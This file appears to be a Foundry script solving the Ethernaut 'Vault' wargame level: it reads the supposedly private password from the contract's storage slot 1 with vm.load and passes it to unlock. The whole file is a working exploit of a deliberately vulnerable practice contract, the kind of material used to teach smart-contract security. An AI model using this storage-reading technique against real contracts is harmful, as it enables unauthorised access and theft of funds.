// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/08_Vault.sol";

contract ExploitScript is Script {

    Vault public level08 = Vault(0x0371e89023D491A8Ece7E5F3a166E5183d01f6ED);

    function run() external {
        vm.startBroadcast();

        bytes32 password = vm.load(address(level08), bytes32(uint256(1)));
        level08.locked();
        level08.unlock(password);
        level08.locked();

        vm.stopBroadcast();
    }
}